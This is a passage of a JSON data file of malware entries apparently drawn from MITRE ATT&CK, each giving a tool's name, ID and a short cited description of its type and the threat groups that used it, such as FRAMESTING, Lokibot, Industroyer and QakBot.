    "description": "[FRAMESTING](https://attack.mitre.org/software/S1120) is a Python web shell that was used during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) to embed into an Ivanti Connect Secure Python package for command execution.(Citation: Mandiant Cutting Edge Part 2 January 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "FRAMESTING"
    ],
    "id": "S1120"
  },
  "malware--bd2ebee8-7c38-408a-871d-221012104222": {
    "name": "NKAbuse",
    "description": "[NKAbuse](https://attack.mitre.org/software/S1107) is a Go-based, multi-platform malware abusing NKN (New Kind of Network) technology for data exchange between peers, functioning as a potent implant, and equipped with both flooder and backdoor capabilities.(Citation: NKAbuse BC)(Citation: NKAbuse SL)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "NKAbuse"
    ],
    "id": "S1107"
  },
  "malware--bd7a9e13-69fa-4243-a5e5-04326a63f9f2": {
    "name": "Pillowmint",
    "description": "[Pillowmint](https://attack.mitre.org/software/S0517) is a point-of-sale malware used by [FIN7](https://attack.mitre.org/groups/G0046) designed to capture credit card information.(Citation: Trustwave Pillowmint June 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Pillowmint"
    ],
    "id": "S0517"
  },
  "malware--bdad6f3b-de88-42fa-9295-d29b5271808e": {
    "name": "TrailBlazer",
    "description": "[TrailBlazer](https://attack.mitre.org/software/S0682) is a modular malware that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2019.(Citation: CrowdStrike StellarParticle January 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "TrailBlazer"
    ],
    "id": "S0682"
  },
  "malware--bdb27a1d-1844-42f1-a0c0-826027ae0326": {
    "name": "Revenge RAT",
    "description": "[Revenge RAT](https://attack.mitre.org/software/S0379) is a freely available remote access tool written in .NET (C#).(Citation: Cylance Shaheen Nov 2018)(Citation: Cofense RevengeRAT Feb 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Revenge RAT"
    ],
    "id": "S0379"
  },
  "malware--bdee9574-7479-4073-a7dc-e86d8acd073a": {
    "name": "MacMa",
    "description": "[MacMa](https://attack.mitre.org/software/S1016) is a macOS-based backdoor with a large set of functionalities to control and exfiltrate files from a compromised computer. [MacMa](https://attack.mitre.org/software/S1016) has been observed in the wild since November 2021.(Citation: ESET DazzleSpy Jan 2022) [MacMa](https://attack.mitre.org/software/S1016) shares command and control and unique libraries with [MgBot](https://attack.mitre.org/software/S1146) and [Nightdoor](https://attack.mitre.org/software/S1147), indicating a relationship with the [Daggerfly](https://attack.mitre.org/groups/G1034) threat actor.(Citation: Symantec Daggerfly 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "MacMa"
    ],
    "id": "S1016"
  },
  "malware--be25c1c0-1590-4219-a3d5-6f31799d1d1b": {
    "name": "FunnyDream",
    "description": "[FunnyDream](https://attack.mitre.org/software/S1044) is a backdoor with multiple components that was used during the [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign since at least 2019, primarily for execution and exfiltration.(Citation: Bitdefender FunnyDream Campaign November 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "FunnyDream"
    ],
    "id": "S1044"
  },
  "malware--bf48e7f8-752c-4ce8-bf8f-748edacd8fa6": {
    "name": "SUNSPOT",
    "description": "[SUNSPOT](https://attack.mitre.org/software/S0562) is an implant that injected the [SUNBURST](https://attack.mitre.org/software/S0559) backdoor into the SolarWinds Orion software update framework. It was used by [APT29](https://attack.mitre.org/groups/G0016) since at least February 2020.(Citation: CrowdStrike SUNSPOT Implant January 2021) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SUNSPOT"
    ],
    "id": "S0562"
  },
  "malware--c009560a-f097-45a3-8f9f-78ec1440a783": {
    "name": "SysUpdate",
    "description": "[SysUpdate](https://attack.mitre.org/software/S0663) is a backdoor written in C++ that has been used by [Threat Group-3390](https://attack.mitre.org/groups/G0027) since at least 2020.(Citation: Trend Micro Iron Tiger April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SysUpdate"
    ],
    "id": "S0663"
  },
  "malware--c113230f-f044-423b-af63-9b63c802f5ae": {
    "name": "OutSteel",
    "description": "[OutSteel](https://attack.mitre.org/software/S1017) is a file uploader and document stealer developed with the scripting language AutoIT that has been used by [Saint Bear](https://attack.mitre.org/groups/G1031) since at least March 2021.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "OutSteel"
    ],
    "id": "S1017"
  },
  "malware--c13d9621-aca7-436b-ab3d-3a95badb3d00": {
    "name": "BackConfig",
    "description": "[BackConfig](https://attack.mitre.org/software/S0475) is a custom Trojan with a flexible plugin architecture that has been used by [Patchwork](https://attack.mitre.org/groups/G0040).(Citation: Unit 42 BackConfig May 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BackConfig"
    ],
    "id": "S0475"
  },
  "malware--c19d19ae-dd58-4584-8469-966bbeaa80e3": {
    "name": "PowGoop",
    "description": "[PowGoop](https://attack.mitre.org/software/S1046) is a loader that consists of a DLL loader and a PowerShell-based downloader; it has been used by [MuddyWater](https://attack.mitre.org/groups/G0069) as their main loader.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: CYBERCOM Iranian Intel Cyber January 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PowGoop"
    ],
    "id": "S1046"
  },
  "malware--c26f1c05-b861-4970-94dc-2f7f921a3074": {
    "name": "BoomBox",
    "description": "[BoomBox](https://attack.mitre.org/software/S0635) is a downloader responsible for executing next stage components that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BoomBox"
    ],
    "id": "S0635"
  },
  "malware--c46eb8e6-bf29-4696-8008-3ddb0b4ca470": {
    "name": "DEADEYE",
    "description": "[DEADEYE](https://attack.mitre.org/software/S1052) is a malware launcher that has been used by [APT41](https://attack.mitre.org/groups/G0096) since at least May 2021. [DEADEYE](https://attack.mitre.org/software/S1052) has variants that can either embed a payload inside a compiled binary (DEADEYE.EMBED) or append it to the end of a file (DEADEYE.APPEND).(Citation: Mandiant APT41)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "DEADEYE"
    ],
    "id": "S1052"
  },
  "malware--c93e3079-43fb-4d8d-9e99-db63d07eadc9": {
    "name": "WIREFIRE",
    "description": "[WIREFIRE](https://attack.mitre.org/software/S1115) is a web shell written in Python that exists as trojanized logic to the visits.py component of Ivanti Connect Secure VPN appliances. [WIREFIRE](https://attack.mitre.org/software/S1115) was used during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) for downloading files and command execution.(Citation: Mandiant Cutting Edge January 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "WIREFIRE"
    ],
    "id": "S1115"
  },
  "malware--c984b414-b766-44c5-814a-2fe96c913c12": {
    "name": "Kessel",
    "description": "[Kessel](https://attack.mitre.org/software/S0487) is an advanced version of OpenSSH which acts as a custom backdoor, mainly acting to steal credentials and function as a bot. [Kessel](https://attack.mitre.org/software/S0487) has been active since its C2 domain began resolving in August 2018.(Citation: ESET ForSSHe December 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Kessel"
    ],
    "id": "S0487"
  },
  "malware--c9b99d03-ff11-4a48-95f0-82660d582c25": {
    "name": "GrimAgent",
    "description": "[GrimAgent](https://attack.mitre.org/software/S0632) is a backdoor that has been used before the deployment of [Ryuk](https://attack.mitre.org/software/S0446) ransomware since at least 2020; it is likely used by [FIN6](https://attack.mitre.org/groups/G0037) and [Wizard Spider](https://attack.mitre.org/groups/G0102).(Citation: Group IB GrimAgent July 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "GrimAgent"
    ],
    "id": "S0632"
  },
  "malware--c9ccc4df-1f56-49e7-ad57-b383e1451688": {
    "name": "LookBack",
    "description": "[LookBack](https://attack.mitre.org/software/S0582) is a remote access trojan written in C++ that was used against at least three US utility companies in July 2019. The TALONITE activity group has been observed using [LookBack](https://attack.mitre.org/software/S0582).(Citation: Proofpoint LookBack Malware Aug 2019)(Citation: Dragos TALONITE)(Citation: Dragos Threat Report 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LookBack"
    ],
    "id": "S0582"
  },
  "malware--ca0fead6-5277-427a-825b-42ff1fbe476e": {
    "name": "STEADYPULSE",
    "description": "[STEADYPULSE](https://attack.mitre.org/software/S1112) is a web shell that infects targeted Pulse Secure VPN servers through modification of a legitimate Perl script that was used as early as 2020 including in activity against US Defense Industrial Base (DIB) entities.(Citation: Mandiant Pulse Secure Zero-Day April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "STEADYPULSE"
    ],
    "id": "S1112"
  },
  "malware--cad3ba95-8c89-4146-ab10-08daa813f9de": {
    "name": "Clop",
    "description": "[Clop](https://attack.mitre.org/software/S0611) is a ransomware family that was first observed in February 2019 and has been used against retail, transportation and logistics, education, manufacturing, engineering, automotive, energy, financial, aerospace, telecommunications, professional and legal services, healthcare, and high tech industries. [Clop](https://attack.mitre.org/software/S0611) is a variant of the CryptoMix ransomware.(Citation: Mcafee Clop Aug 2019)(Citation: Cybereason Clop Dec 2020)(Citation: Unit42 Clop April 2021) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Clop"
    ],
    "id": "S0611"
  },
  "malware--cb444a16-3ea5-4a91-88c6-f329adcb8af3": {
    "name": "YAHOYAH",
    "description": "[YAHOYAH](https://attack.mitre.org/software/S0388) is a Trojan used by [Tropic Trooper](https://attack.mitre.org/groups/G0081) as a second-stage backdoor.(Citation: TrendMicro TropicTrooper 2015)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "YAHOYAH"
    ],
    "id": "S0388"
  },
  "malware--cb741463-f0fe-42e0-8d45-bc7e8335f5ae": {
    "name": "Lokibot",
    "description": "[Lokibot](https://attack.mitre.org/software/S0447) is a widely distributed information stealer that was first reported in 2015. It is designed to steal sensitive information such as usernames, passwords, cryptocurrency wallets, and other credentials. [Lokibot](https://attack.mitre.org/software/S0447) can also create a backdoor into infected systems to allow an attacker to install additional payloads.(Citation: Infoblox Lokibot January 2019)(Citation: Morphisec Lokibot April 2020)(Citation: CISA Lokibot September 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Lokibot"
    ],
    "id": "S0447"
  },
  "malware--cc4c1287-9c86-4447-810c-744f3880ec37": {
    "name": "Egregor",
    "description": "[Egregor](https://attack.mitre.org/software/S0554) is a Ransomware-as-a-Service (RaaS) tool that was first observed in September 2020. Researchers have noted code similarities between [Egregor](https://attack.mitre.org/software/S0554) and Sekhmet ransomware, as well as [Maze](https://attack.mitre.org/software/S0449) ransomware.(Citation: NHS Digital Egregor Nov 2020)(Citation: Cyble Egregor Oct 2020)(Citation: Security Boulevard Egregor Oct 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Egregor"
    ],
    "id": "S0554"
  },
  "malware--cc5497f7-a9e8-436f-94da-b2b4a9b9ad3c": {
    "name": "PoetRAT",
    "description": "[PoetRAT](https://attack.mitre.org/software/S0428) is a remote access trojan (RAT) that was first identified in April 2020. [PoetRAT](https://attack.mitre.org/software/S0428) has been used in multiple campaigns against the private and public sectors in Azerbaijan, including ICS and SCADA systems in the energy sector. The STIBNITE activity group has been observed using the malware. [PoetRAT](https://attack.mitre.org/software/S0428) derived its name from references in the code to poet William Shakespeare. (Citation: Talos PoetRAT April 2020)(Citation: Talos PoetRAT October 2020)(Citation: Dragos Threat Report 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PoetRAT"
    ],
    "id": "S0428"
  },
  "malware--cfc75b0d-e579-40ae-ad07-a1ce00d49a6c": {
    "name": "ZxShell",
    "description": "[ZxShell](https://attack.mitre.org/software/S0412) is a remote administration tool and backdoor that can be downloaded from the Internet, particularly from Chinese hacker websites. It has been used since at least 2004.(Citation: FireEye APT41 Aug 2019)(Citation: Talos ZxShell Oct 2014)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ZxShell"
    ],
    "id": "S0412"
  },
  "malware--d1008b78-960c-4b36-bdc4-39a734e1e4e3": {
    "name": "SLIGHTPULSE",
    "description": "[SLIGHTPULSE](https://attack.mitre.org/software/S1110) is a web shell that was used by [APT5](https://attack.mitre.org/groups/G1023) as early as 2020 including against Pulse Secure VPNs at US Defense Industrial Base (DIB) entities.(Citation: Mandiant Pulse Secure Zero-Day April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SLIGHTPULSE"
    ],
    "id": "S1110"
  },
  "malware--d18cb958-f4ad-4fb3-bb4f-e8994d206550": {
    "name": "Penquin",
    "description": "[Penquin](https://attack.mitre.org/software/S0587) is a remote access trojan (RAT) with multiple versions used by [Turla](https://attack.mitre.org/groups/G0010) to target Linux systems since at least 2014.(Citation: Kaspersky Turla Penquin December 2014)(Citation: Leonardo Turla Penquin May 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Penquin"
    ],
    "id": "S0587"
  },
  "malware--d1b7830a-fced-4be3-a99c-f495af9d9e1b": {
    "name": "BabyShark",
    "description": "[BabyShark](https://attack.mitre.org/software/S0414) is a Microsoft Visual Basic (VB) script-based malware family that is believed to be associated with several North Korean campaigns. (Citation: Unit42 BabyShark Feb 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BabyShark"
    ],
    "id": "S0414"
  },
  "malware--d23de441-f9cf-4802-b1ff-f588a11a896b": {
    "name": "CreepySnail",
    "description": "[CreepySnail](https://attack.mitre.org/software/S1024) is a custom PowerShell implant that has been used by [POLONIUM](https://attack.mitre.org/groups/G1005) since at least 2022.(Citation: Microsoft POLONIUM June 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "CreepySnail"
    ],
    "id": "S1024"
  },
  "malware--d2c7f8ad-3b50-4cfa-bbb1-799eff06fb40": {
    "name": "build_downer",
    "description": "[build_downer](https://attack.mitre.org/software/S0471) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "build_downer"
    ],
    "id": "S0471"
  },
  "malware--d3105fb5-c494-4fd1-a7be-414eab9e0c96": {
    "name": "Melcoz",
    "description": "[Melcoz](https://attack.mitre.org/software/S0530) is a banking trojan family built from the open source tool Remote Access PC. [Melcoz](https://attack.mitre.org/software/S0530) was first observed in attacks in Brazil and since 2018 has spread to Chile, Mexico, Spain, and Portugal.(Citation: Securelist Brazilian Banking Malware July 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Melcoz"
    ],
    "id": "S0530"
  },
  "malware--d52291b4-bb23-45a8-aef0-3dc7e986ba15": {
    "name": "PowerPunch",
    "description": "[PowerPunch](https://attack.mitre.org/software/S0685) is a lightweight downloader that has been used by [Gamaredon Group](https://attack.mitre.org/groups/G0047) since at least 2021.(Citation: Microsoft Actinium February 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PowerPunch"
    ],
    "id": "S0685"
  },
  "malware--d6e55656-e43f-411f-a7af-45df650471c5": {
    "name": "Kinsing",
    "description": "[Kinsing](https://attack.mitre.org/software/S0599) is Golang-based malware that runs a cryptocurrency miner and attempts to spread itself to other hosts in the victim environment. (Citation: Aqua Kinsing April 2020)(Citation: Sysdig Kinsing November 2020)(Citation: Aqua Security Cloud Native Threat Report June 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Kinsing"
    ],
    "id": "S0599"
  },
  "malware--d79b1800-3b5d-4a4f-8863-8251eca793e2": {
    "name": "PITSTOP",
    "description": "[PITSTOP](https://attack.mitre.org/software/S1123) is a backdoor that was deployed on compromised Ivanti Connect Secure VPNs during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) to enable command execution and file read/write.(Citation: Mandiant Cutting Edge Part 3 February 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PITSTOP"
    ],
    "id": "S1123"
  },
  "malware--d79e7a60-5de9-448e-a074-f95d2d80f8d0": {
    "name": "Meteor",
    "description": "[Meteor](https://attack.mitre.org/software/S0688) is a wiper that was used against Iranian government organizations, including Iranian Railways, the Ministry of Roads, and Urban Development systems, in July 2021. [Meteor](https://attack.mitre.org/software/S0688) is likely a newer version of similar wipers called Stardust and Comet that were reportedly used by a group called \"Indra\" since at least 2019 against private companies in Syria.(Citation: Check Point Meteor Aug 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Meteor"
    ],
    "id": "S0688"
  },
  "malware--d906e6f7-434c-44c0-b51a-ed50af8f7945": {
    "name": "njRAT",
    "description": "[njRAT](https://attack.mitre.org/software/S0385) is a remote access tool (RAT) that was first observed in 2012. It has been used by threat actors in the Middle East.(Citation: Fidelis njRAT June 2013)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "njRAT"
    ],
    "id": "S0385"
  },
  "malware--d9765cbd-4c88-4805-ba98-4c6ccb56b864": {
    "name": "ZIPLINE",
    "description": "[ZIPLINE](https://attack.mitre.org/software/S1114) is a passive backdoor that was used during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) on compromised Secure Connect VPNs for reverse shell and proxy functionality.(Citation: Mandiant Cutting Edge January 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ZIPLINE"
    ],
    "id": "S1114"
  },
  "malware--d9f7383c-95ec-4080-bbce-121c9384457b": {
    "name": "Maze",
    "description": "[Maze](https://attack.mitre.org/software/S0449) ransomware, previously known as \"ChaCha\", was discovered in May 2019. In addition to encrypting files on victim machines for impact, [Maze](https://attack.mitre.org/software/S0449) operators conduct information stealing campaigns prior to encryption and post the information online to extort affected companies.(Citation: FireEye Maze May 2020)(Citation: McAfee Maze March 2020)(Citation: Sophos Maze VM September 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Maze"
    ],
    "id": "S0449"
  },
  "malware--dcac85c1-6485-4790-84f6-de5e6f6b91dd": {
    "name": "PowerStallion",
    "description": "[PowerStallion](https://attack.mitre.org/software/S0393) is a lightweight [PowerShell](https://attack.mitre.org/techniques/T1059/001) backdoor used by [Turla](https://attack.mitre.org/groups/G0010), possibly as a recovery access tool to install other backdoors.(Citation: ESET Turla PowerShell May 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PowerStallion"
    ],
    "id": "S0393"
  },
  "malware--dcd9548e-df9e-47c2-81f3-bc084289959d": {
    "name": "ANDROMEDA",
    "description": "[ANDROMEDA](https://attack.mitre.org/software/S1074) is commodity malware that was widespread in the early 2010's and continues to be observed in infections across a wide variety of industries. During the 2022 [C0026](https://attack.mitre.org/campaigns/C0026) campaign, threat actors re-registered expired [ANDROMEDA](https://attack.mitre.org/software/S1074) C2 domains to spread malware to select targets in Ukraine.(Citation: Mandiant Suspected Turla Campaign February 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ANDROMEDA"
    ],
    "id": "S1074"
  },
  "malware--dd889a55-fb2c-4ec7-8e9f-c399939a49e1": {
    "name": "IceApple",
    "description": "[IceApple](https://attack.mitre.org/software/S1022) is a modular Internet Information Services (IIS) post-exploitation framework, that has been used since at least 2021 against the technology, academic, and government sectors.(Citation: CrowdStrike IceApple May 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "IceApple"
    ],
    "id": "S1022"
  },
  "malware--df350889-4de9-44e5-8cb3-888b8343e97c": {
    "name": "metaMain",
    "description": "[metaMain](https://attack.mitre.org/software/S1059) is a backdoor used by [Metador](https://attack.mitre.org/groups/G1013) to maintain long-term access to compromised machines; it has also been used to decrypt [Mafalda](https://attack.mitre.org/software/S1060) into memory.(Citation: SentinelLabs Metador Sept 2022)(Citation: SentinelLabs Metador Technical Appendix Sept 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "metaMain"
    ],
    "id": "S1059"
  },
  "malware--df4cd566-ff2f-4d08-976d-8c86e95782de": {
    "name": "SideTwist",
    "description": "[SideTwist](https://attack.mitre.org/software/S0610) is a C-based backdoor that has been used by [OilRig](https://attack.mitre.org/groups/G0049) since at least 2021.(Citation: Check Point APT34 April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SideTwist"
    ],
    "id": "S0610"
  },
  "malware--df9b350b-d4f9-4e79-a826-75cc75fbc1eb": {
    "name": "KOCTOPUS",
    "description": "[KOCTOPUS](https://attack.mitre.org/software/S0669)'s batch variant is loader used by [LazyScripter](https://attack.mitre.org/groups/G0140) since 2018 to launch [Octopus](https://attack.mitre.org/software/S0340) and [Koadic](https://attack.mitre.org/software/S0250) and, in some cases, [QuasarRAT](https://attack.mitre.org/software/S0262). [KOCTOPUS](https://attack.mitre.org/software/S0669) also has a VBA variant that has the same functionality as the batch version.(Citation: MalwareBytes LazyScripter Feb 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "KOCTOPUS"
    ],
    "id": "S0669"
  },
  "malware--dfa03c7d-79ed-4ce2-b9d1-ddc9dbf56ad2": {
    "name": "MechaFlounder",
    "description": "[MechaFlounder](https://attack.mitre.org/software/S0459) is a python-based remote access tool (RAT) that has been used by [APT39](https://attack.mitre.org/groups/G0087). The payload uses a combination of actor developed code and code snippets freely available online in development communities.(Citation: Unit 42 MechaFlounder March 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "MechaFlounder"
    ],
    "id": "S0459"
  },
  "malware--dff90475-9f72-41a6-84ed-1fbefd3874c0": {
    "name": "Heyoka Backdoor",
    "description": "[Heyoka Backdoor](https://attack.mitre.org/software/S1027) is a custom backdoor--based on the Heyoka open source exfiltration tool--that  has been used by [Aoqin Dragon](https://attack.mitre.org/groups/G1007) since at least 2013.(Citation: SentinelOne Aoqin Dragon June 2022)(Citation: Sourceforge Heyoka 2022) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Heyoka Backdoor"
    ],
    "id": "S1027"
  },
  "malware--e14085cb-0e8d-4be6-92ba-e3b93ee5978f": {
    "name": "XCSSET",
    "description": "[XCSSET](https://attack.mitre.org/software/S0658) is a modular macOS malware family delivered through infected Xcode projects and executed when the project is compiled. Active since August 2020, it has been observed installing backdoors, spoofed browsers, collecting data, and encrypting user files. It is composed of SHC-compiled shell scripts and run-only AppleScripts, often hiding in apps that mimic system tools (such as Xcode, Mail, or Notes) or use familiar icons (like Launchpad) to avoid detection.(Citation: trendmicro xcsset xcode project 2020)(Citation: April 2021 TrendMicro XCSSET)(Citation: Microsoft March 2025 XCSSET)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "XCSSET"
    ],
    "id": "S0658"
  },
  "malware--e1445afd-c359-45ed-8f27-626dc4d5e157": {
    "name": "Disco",
    "description": "[Disco](https://attack.mitre.org/software/S1088) is a custom implant that has been used by [MoustachedBouncer](https://attack.mitre.org/groups/G1019) since at least 2020 including in campaigns using targeted malicious content injection for initial access and command and control.(Citation: MoustachedBouncer ESET August 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Disco"
    ],
    "id": "S1088"
  },
  "malware--e221eb77-1502-4129-af1d-fe1ad55e7ec6": {
    "name": "KillDisk",
    "description": "[KillDisk](https://attack.mitre.org/software/S0607) is a disk-wiping tool designed to overwrite files with random data to render the OS unbootable. It was first observed as a component of [BlackEnergy](https://attack.mitre.org/software/S0089) malware during cyber attacks against Ukraine in 2015. [KillDisk](https://attack.mitre.org/software/S0607) has since evolved into stand-alone malware used by a variety of threat actors against additional targets in Europe and Latin America; in 2016 a ransomware component was also incorporated into some [KillDisk](https://attack.mitre.org/software/S0607) variants.(Citation: KillDisk Ransomware)(Citation: ESEST Black Energy Jan 2016)(Citation: Trend Micro KillDisk 1)(Citation: Trend Micro KillDisk 2)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "KillDisk"
    ],
    "id": "S0607"
  },
  "malware--e2d34c63-6f5a-41f5-86a2-e2380f27f858": {
    "name": "AppleJeus",
    "description": "[AppleJeus](https://attack.mitre.org/software/S0584) is a family of downloaders initially discovered in 2018 embedded within trojanized cryptocurrency applications. [AppleJeus](https://attack.mitre.org/software/S0584) has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032), targeting companies in the energy, finance, government, industry, technology, and telecommunications sectors, and several countries including the United States, United Kingdom, South Korea, Australia, Brazil, New Zealand, and Russia. [AppleJeus](https://attack.mitre.org/software/S0584) has been used to distribute the [FALLCHILL](https://attack.mitre.org/software/S0181) RAT.(Citation: CISA AppleJeus Feb 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "AppleJeus"
    ],
    "id": "S0584"
  },
  "malware--e33e4603-afab-402d-b2a1-248d435b5fe0": {
    "name": "SoreFang",
    "description": "[SoreFang](https://attack.mitre.org/software/S0516) is first stage downloader used by [APT29](https://attack.mitre.org/groups/G0016) for exfiltration and to load other malware.(Citation: NCSC APT29 July 2020)(Citation: CISA SoreFang July 2016)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SoreFang"
    ],
    "id": "S0516"
  },
  "malware--e355fc84-6f3c-4888-8e0a-d7fa9c378532": {
    "name": "STARWHALE",
    "description": "[STARWHALE](https://attack.mitre.org/software/S1037) is Windows Script File (WSF) backdoor that has been used by [MuddyWater](https://attack.mitre.org/groups/G0069), possibly since at least November 2021; there is also a [STARWHALE](https://attack.mitre.org/software/S1037) variant written in Golang with similar capabilities. Security researchers have also noted the use of [STARWHALE](https://attack.mitre.org/software/S1037) by UNC3313, which may be associated with [MuddyWater](https://attack.mitre.org/groups/G0069).(Citation: Mandiant UNC3313 Feb 2022)(Citation: DHS CISA AA22-055A MuddyWater February 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "STARWHALE"
    ],
    "id": "S1037"
  },
  "malware--e401d4fe-f0c9-44f0-98e6-f93487678808": {
    "name": "Industroyer",
    "description": "[Industroyer](https://attack.mitre.org/software/S0604) is a sophisticated malware framework designed to cause an impact to the working processes of Industrial Control Systems (ICS), specifically components used in electrical substations.(Citation: ESET Industroyer) [Industroyer](https://attack.mitre.org/software/S0604) was used in the attacks on the Ukrainian power grid in December 2016.(Citation: Dragos Crashoverride 2017) This is the first publicly known malware specifically designed to target and impact operations in the electric grid.(Citation: Dragos Crashoverride 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Industroyer"
    ],
    "id": "S0604"
  },
  "malware--e4feffc2-53d1-45c9-904e-adb9faca0d15": {
    "name": "Pcexter",
    "description": "[Pcexter](https://attack.mitre.org/software/S1102) is an uploader that has been used by [ToddyCat](https://attack.mitre.org/groups/G1022) since at least 2023 to exfiltrate stolen files.(Citation: Kaspersky ToddyCat Check Logs October 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Pcexter"
    ],
    "id": "S1102"
  },
  "malware--e7863f5d-cb6a-4f81-8804-0a635eec160a": {
    "name": "Kevin",
    "description": "[Kevin](https://attack.mitre.org/software/S1020) is a backdoor implant written in C++ that has been used by [HEXANE](https://attack.mitre.org/groups/G1001) since at least June 2020, including in operations against organizations in Tunisia.(Citation: Kaspersky Lyceum October 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Kevin"
    ],
    "id": "S1020"
  },
  "malware--e928333f-f3df-4039-9b8b-556c2add0e42": {
    "name": "ECCENTRICBANDWAGON",
    "description": "[ECCENTRICBANDWAGON](https://attack.mitre.org/software/S0593) is a remote access Trojan (RAT) used by North Korean cyber actors that was first identified in August 2020. It is a reconnaissance tool--with keylogging and screen capture functionality--used for information gathering on compromised systems.(Citation: CISA EB Aug 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ECCENTRICBANDWAGON"
    ],
    "id": "S0593"
  },
  "malware--eac3d77f-2b7b-4599-ba74-948dc16633ad": {
    "name": "Goopy",
    "description": "[Goopy](https://attack.mitre.org/software/S0477) is a Windows backdoor and Trojan used by [APT32](https://attack.mitre.org/groups/G0050) and shares several similarities to another backdoor used by the group ([Denis](https://attack.mitre.org/software/S0354)). [Goopy](https://attack.mitre.org/software/S0477) is named for its impersonation of the legitimate Google Updater executable.(Citation: Cybereason Cobalt Kitty 2017)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Goopy"
    ],
    "id": "S0477"
  },
  "malware--ec9e00dd-0313-4d5b-8105-c20aa47abffc": {
    "name": "ShadowPad",
    "description": "[ShadowPad](https://attack.mitre.org/software/S0596) is a modular backdoor that was first identified in a supply chain compromise of the NetSarang software in mid-July 2017. The malware was originally thought to be exclusively used by [APT41](https://attack.mitre.org/groups/G0096), but has since been observed to be used by various Chinese threat activity groups. (Citation: Recorded Future RedEcho Feb 2021)(Citation: Securelist ShadowPad Aug 2017)(Citation: Kaspersky ShadowPad Aug 2017) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ShadowPad"
    ],
    "id": "S0596"
  },
  "malware--edc5e045-5401-42bb-ad92-52b5b2ee0de9": {
    "name": "QakBot",
    "description": "[QakBot](https://attack.mitre.org/software/S0650) is a modular banking trojan that has been used primarily by financially-motivated actors since at least 2007. [QakBot](https://attack.mitre.org/software/S0650) is continuously maintained and developed and has evolved from an information stealer into a delivery agent for ransomware, most notably [ProLock](https://attack.mitre.org/software/S0654) and [Egregor](https://attack.mitre.org/software/S0554).(Citation: Trend Micro Qakbot December 2020)(Citation: Red Canary Qbot)(Citation: Kaspersky QakBot September 2021)(Citation: ATT QakBot April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "QakBot"
    ],
    "id": "S0650"
  },
  "malware--edf5aee2-9b1c-4252-8e64-25b12f14c8b3": {
    "name": "SYSCON",
